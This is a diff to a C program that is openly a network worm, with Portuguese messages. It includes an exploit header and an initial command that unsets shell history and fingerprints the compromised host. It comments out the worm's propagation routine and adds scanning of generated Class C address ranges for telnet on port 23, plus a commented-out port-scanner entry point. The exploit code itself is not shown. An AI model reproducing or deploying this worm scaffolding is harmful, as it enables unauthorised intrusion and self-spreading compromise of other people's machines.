@@ -6,6 +6,7 @@
 #include <netinet/in.h>
 
 #include "exploit.h"
+#include "recon.h"
 
 #define INIT_CMD "unset HISTFILE;id;uname -a;\n"
 #define MAX_COMMAND_SIZE 1024
@@ -38,12 +39,20 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }
 
-    printf("# Propagating worm...\n");
-    ret = propagate(fd);
-    if (ret < 0) {
-        fprintf(stderr, "Falha ao propagar o worm.\n");
-        exit(EXIT_FAILURE);
-    }
+    // printf("# Propagating worm...\n");
+    // ret = propagate(fd);
+    // if (ret < 0) {
+    //     fprintf(stderr, "Falha ao propagar o worm.\n");
+    //     exit(EXIT_FAILURE);
+    // }
+
+    range range_ip_c[4];
+    generateIPs(CLASS_C, range_ip_c);
+    range porta;
+    porta.start = 23;
+    porta.end = 23;
+    startTestConnection(range_ip_c, porta); 
+
 
     // ret = shell(fd);
     // if (ret < 0) {
@@ -220,3 +229,84 @@ int shell(int fd) {
 
     return 0;
 }
+
+
+
+// int main(int argc, char **argv){
+//     char *ip;
+//     int ipRange;
+//     int ipLastField;
+//     int porta;
+//     int portaRange;
+
+    
+//     printf("Varredura iniciada em: ");
+//     printTimestamp();
+//     printf("\n");
+//     /* verifica o range de ips */
+//     if(argv[1] != NULL){
+    
+//         if(regexValidation(argv[1], IP_REGEX)) {
+//             printf("IP: %s\n", argv[1]);
+//             ip = malloc(strlen(argv[1]));
+//             strcpy(ip, argv[1]);
+//             ipRange = getRange(ip, "-");
+//             ipLastField = getLastField(ip);
+//             if(ipRange < ipLastField && ipRange != 0){
+//                 printf("\nErro:\nValor do range do ip menor do que valor do campo ip\n");
+//                 return 0;
+//             }
+//             else{
+//                 if(ipRange == 0)
+//                     ipRange = ipLastField;
+//             }
+//             ip = ipSplit(ip);
+//         }
+//         else{
+//             printf("\nFormato do IP inválido\n");
+//             return 0;
+//         }
+//     }
+//     else{
+//         printf("\nErro:\nValor do ip não pode ser nulo\n");
+//         return 0;
+//     }
+
+//     /* verifica o range de portas */
+//     if(argv[2] != NULL){
+//         if(regexValidation(argv[2], PORT_REGEX)){
+//             printf("Portas: %s\n", argv[2]);
+
+//             char *strPorta = malloc(strlen(argv[2]));
+//             strcpy(strPorta, argv[2]);
+//             portaRange = getRange(strPorta, "-");
+//             porta = atoi(strPorta);
+//             if(portaRange < porta && portaRange != 0){
+//                 printf("\nErro:\nValor do range da porta menor do que valor do campo porta\n");
+//                 return 0;
+//             }
+//             else{
+//                 if(portaRange == 0)
+//                     portaRange = porta;
+//             }
+//         }
+//         else{
+//             printf("\nFormato da porta inválido\n");
+//             return 0;
+//         }
+//     }
+//     else{
+//         porta = 0;
+//         portaRange = 65536;
+//         printf("Portas: 0-65536\n");
+//     }
+
+//     printf("---\n");
+    
+//     /* cria uma lista de ips e portas a serem varridos */
+//     char ***ips = calloc(1, sizeof(char **));
+//     generateIPs(ips, ipLastField, ipRange, ip);
+
+//     /* inicia a varredura */
+//     startTestConnection(ips, ipRange - ipLastField, porta, portaRange);
+// }
